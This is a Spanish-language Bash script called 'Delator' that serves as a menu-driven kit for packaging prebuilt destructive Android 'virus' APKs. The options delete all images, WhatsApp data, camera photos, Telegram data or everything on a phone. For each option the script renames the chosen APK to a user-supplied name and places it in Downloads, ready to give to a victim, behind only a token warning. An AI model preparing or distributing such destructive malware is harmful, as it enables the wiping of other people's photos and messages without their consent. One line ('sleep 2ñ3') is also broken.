
clear
echo 'Si no hay un motivo digno a usar el script, no lo use, por otra parte puede realizar daño no merecido según el virus elegido'
sleep 7
echo '

Las apks virus realizadas furon creadas por VW_'
sleep 3
clear
echo -e '\e[1;31m                 _________-----_____
       _____------           __      ----_
___----             ___------              \
   ----________        ----                 \
               -----__    |             _____)
                    __-                /     \
        _______-----    ___--          \    /)\
  ------_______      ---____            \__/  /
               -----__    \ --    _          /\
     Destroy          --__--__     \_____/   \_/\
      Знішчыць                ----|   /          |
       Lestroy                    |  |___________|
        Ajeagge                   |  | ((_(_)| )_)
         Tuhota                   |  \_((_(_)|/(_)
          Ødelægge                \             (
           Ravao                   \_____________)

\e[0m'
sleep 2
echo -e '\e[1;32m[ X ] Welcome to Delator [ X ]

\e[0m'
delimg() {
sleep 1.8
echo -e '\e[1;31m '
read -p 'Elige un nombre para la apk virus (ej.virus): ' appnom
cp -r deli.apk $appnom.apk
sleep 2
echo -e '\e[1;37m [+] Renombrando apk...
'
mv $appnom.apk ~/storage/downloads
sleep 2
echo '[+]Almacando apk...'

echo '
Virus almacenado en (Descargas)

'
read -p '[+] Desea regresar al menú (Y/N)?: ' menu
case $menu in
Y | si | S | s | Yes)
	sleep 2
	bash delator.sh
	;;
*)
	exit
	;;
esac
}
delcam() {
sleep 1.8
echo -e '\e[1;31m '
read -p 'Elige un nombre para la apk virus (ej.virus): ' appnom
cp -r delc.apk $appnom.apk
echo -e '\e[1;37m
[+] Renombrando apk...'
sleep 2ñ3
mv $appnom.apk ~/storage/downloads
echo '
[+]Almacenando apk...'
sleep 3
echo '
Virus almacenado en (Descargas) como:' $appnom
echo ' '
sleep 2
read -p '[+] Desea regresar al menú (Y/N)?: ' menu
case $menu in
Y | si | S | s | Yes)
        sleep 2
        bash delator.sh
        ;;
*)
        exit
        ;;
esac
}
delwhatsapp() {
sleep 1.8
echo -e '\e[1;31m '
read -p 'Elige un nombre para la apk virus (ej.virus): ' appnom
cp -r delw.apk $appnom.apk
echo -e '\e[1;37m
[+] Renombrando apk...'
sleep 3
mv $appnom.apk ~/storage/downloads
echo '[+]Almacenando virus...'
sleep 3
echo '
Virus almacenado en (Descargas) como:' $appnom
echo ' '
sleep 2
read -p '[+] Desea regresar al menú (Y/N)?: ' menu
case $menu in
Y | si | S | s | Yes)
        sleep 2
        bash delator.sh
        ;;
*)
        exit
        ;;
esac
}
deltelegram() {
sleep 1.8
echo -e '\e[1;31m '
read -p 'Elige un nombre para la apk virus (ej.virus): ' appnom
cp -r delt.apk $appnom.apk
echo -e '\e[1;37m
[+] Renombrando apk...'
sleep 3
mv $appnom.apk ~/storage/downloads
echo '
[+] Almacenando virus...'
sleep 3
echo '
Virus almacenado en (Descargas) como:' $appnom
echo ' '
sleep 2
read -p '[+] Desea regresar al menú (Y/N)?: ' menu
case $menu in
Y | si | S | s | Yes)
        sleep 2
        bash delator.sh
        ;;
*)
        exit
        ;;
esac
}
delall() {
sleep 1.8
echo -e '\e[1;31m'
read -p 'Elige un nombre para la apk virus (ej.virus): ' appnom
cp -r dell.apk $appnom.apk
echo -e '\e[1;37m
[+] Renombrando apk...'
sleep 3
mv $appnom.apk ~/storage/downloads
echo '
[+] Almacenando virus...'
sleep 3
echo '
Virus almacenado en (Descargas) como:' $appnom
echo ' '
sleep 2
read -p '[+] Desea regresar al menú (Y/N)?: ' menu
case $menu in
Y | si | S | s | Yes)
        sleep 2
        bash delator.sh
        ;;
*)
        exit
        ;;
esac
}
sleep 1.3
echo '
▶(01) Eliminar imagenes (todas)  ◀'
sleep 0.1
echo '▶(02) Eliminar WhatsApp          ◀'
sleep 0.1
echo '▶(03) Eliminar Fotos Camera      ◀'
sleep 0.1
echo '▶(04) Eliminar Telegram          ◀'
sleep 0.1
echo '▶(05) Eliminar Todo              ◀'
sleep 0.1 
echo '▶(99) Autor                      ◀'
sleep 1
echo -e '\e[1;32m

'

read -p '[+] A continuación, elige la apk a utilizar: ' app
case $app in
01 | 1)
        sleep 1.8
        echo -e '\e[1;37mCargando...'
        delimg
        ;;
02 | 2)
        sleep 1.8
        echo -e '\e[1;37mCargando...'
        delwhatsapp
        ;;
03 | 3)
        sleep 1.8
        echo -e '\e[1;37mCargando...'
        delcam
        ;;
04 | 4)
        sleep 1.8
        echo -e '\e[1;37mCargando...'
        deltelegram
        ;;
05 | 5)
        sleep 1.8
        echo -e '\e[1;31mCargando...'
        delall
        ;;
99)
	sleep 2
	echo ' '
	echo -e '\e[1;31m Autor: VWolf . Autor apks: VWolf, las aks fueron creadas mediante js, la necedidad de eliminar cualquier cosa es una sola linea... Visita mi web > https://vwolf.site > Gracias por usar el Script :)
'
	;;
*)
        sleep 1.8
        echo ' '
        echo 'Elige una de las 5 opciones disponibles...'
        ;;
esac
